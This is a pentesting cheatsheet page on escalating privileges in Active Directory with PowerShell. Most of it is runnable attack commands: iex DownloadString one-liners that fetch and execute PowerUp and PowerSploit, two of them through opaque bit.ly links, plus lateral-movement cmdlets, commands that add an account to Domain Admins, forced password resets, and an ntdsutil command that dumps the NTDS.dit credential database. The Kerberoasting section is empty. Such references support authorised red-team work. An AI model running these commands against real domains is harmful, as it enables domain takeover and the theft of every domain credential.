---
layout: default
title: Active Directory Privilege Escalation with Powershell
parent: Pentesting
categories: Pentesting Windows
grand_parent: Cheatsheets
has_children: true
---

# {{ page.title}}

## PRE-REQUISITE: Installing PowerUp and PowerSploit

- [PowerUp CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
- [PowerSploit CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerSploit.pdf)

```powershell
# ActiveDirectory Module
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# PowerUp Module
iex (new-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk'); . .\PowerUp.ps1

# PowerSploit Module
iex (new-Object Net.WebClient).DownloadString('http://bit.ly/28RwLgo'); . .\PowerSploit.ps1

```

## LATERAL MOVEMENT
```powershell
Invoke-DCOM
Invoke-SMBExec
Invoke-PsExec
Invoke-Command
mstsc.exe
```

## TOKEN IMPERSONATION

## ADD MEMBER
```
# OPTION 1
net group "Domain admins" dagreat /add /domain

# OPTION 2
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\dagreat',$SecPassword)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'jomivz' -Credential $Cred

# VERIFICATION
Get-DomainGroupMember -Identity 'Domain Admins'
```


## FORCE PASSWORD CHANGE
```
# OPTION 1
net user dagreat Password123! /domain

# OPTION 2
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\dagreat',$SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity dagreat -AccountPassword $UserPassword -Credential $Cred
```

## KERBEROASTING
```

```

## DUMP NTDS.DIT
```
ntdsutil.exe "activate instance ntds" "ifm" "Create Full C:\Temp\ntds.dmp" quit quit
```
